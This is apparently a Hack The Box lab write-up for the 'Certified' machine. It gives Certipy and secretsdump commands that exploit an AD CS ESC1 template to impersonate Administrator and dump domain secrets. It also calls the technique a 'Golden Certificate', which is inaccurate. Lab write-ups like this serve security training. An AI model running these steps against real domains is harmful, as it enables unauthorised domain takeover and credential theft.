---
title: "HTB: Certified"
tags: [htb, windows, medium, adcs, esc1, pki]

description: "Active Directory Certificate Services (AD CS) abuse. Exploiting ESC1 to forge a Golden Certificate."
---

# Hack The Box: Certified

**Machine IP**: `10.10.10.x`
**OS**: Windows
**Difficulty**: Medium

Certified is the definitive AD CS box. It teaches you how to abuse the **Public Key Infrastructure (PKI)** of a domain.

## 1. Reconnaissance
We start with creds found via a web app (generic start).
We run **Certipy** to scan for vulnerable certificate templates.
```bash
certipy find -u 'user' -p 'pass' -dc-ip 10.10.10.x -vulnerable
```
**Output**:
`Vulnerable Templates: [UserAuthentication]`
`Vulnerability: ESC1`

## 2. Exploitation (ESC1)
**ESC1** means a template allows:
1.  Client Authentication (Logging in).
2.  **ENROLLEE_SUPPLIES_SUBJECT**: The requester can say "I am the Administrator".

**Attack**:
We request a certificate *claiming* to be the Administrator.
```bash
certipy req -u 'user' -p 'pass' -target 10.10.10.x -template UserAuthentication -ca 'Certified-CA' -upn Administrator@certified.htb
```
We get `administrator.pfx`.

## 3. Authentication
We use the certificate to request a Kerberos TGT (Ticket Granting Ticket).
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.x
```
**Output**:
`Got TGT for Administrator`.

We export the ticket cache: `export KRB5CCNAME=administrator.ccache`.
We proceed to dump secrets.
`secretsdump.py -k -no-pass certified.htb/administrator@10.10.10.x`

## Conclusion
AD CS is the new "Admin in 1 Step" vulnerability class. ESC1 is trivial to exploit if configured poorly.
